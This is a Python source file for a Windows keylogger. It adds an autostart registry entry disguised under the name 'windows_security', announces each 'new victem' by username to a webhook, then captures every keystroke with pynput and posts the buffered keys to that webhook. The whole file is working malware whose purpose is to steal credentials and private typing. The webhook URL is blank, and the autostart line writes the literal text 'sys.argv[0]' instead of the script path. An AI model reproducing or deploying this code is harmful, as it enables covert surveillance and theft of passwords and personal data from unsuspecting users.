import winreg, sys, requests, os
from pynput.keyboard import Key, Listener

webhookUrl = ''     
name = 'windows_security'  
keysBuffer = ''    

# Autostart features
winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")    
registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)    
winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, f'"sys.argv[0]"')    
winreg.CloseKey(registry_key)    

def SendMessage(message):
    global webhookUrl
    messageData = {
       "content": message,
        "embeds": None,
        "attachments": []
    }
    requests.post(webhookUrl, json=messageData)

SendMessage(f'New victem - {os.getenv('USERPROFILE').replace('C:\\Users\\', '')}')

def OnPress(key):     
    global keysBuffer
    if str(key)[:4] == 'Key.':      
        key = ' `[' + str(key) + ']`'
    else:
        key = str(key)[1] 
    if len(keysBuffer) + len(key) >= 1975 or key == ' `[Key.enter]`':    
        SendMessage(keysBuffer + key)    
        keysBuffer = ''    
    else:
        keysBuffer += key    

with Listener(on_press=OnPress) as listener:
    listener.join()               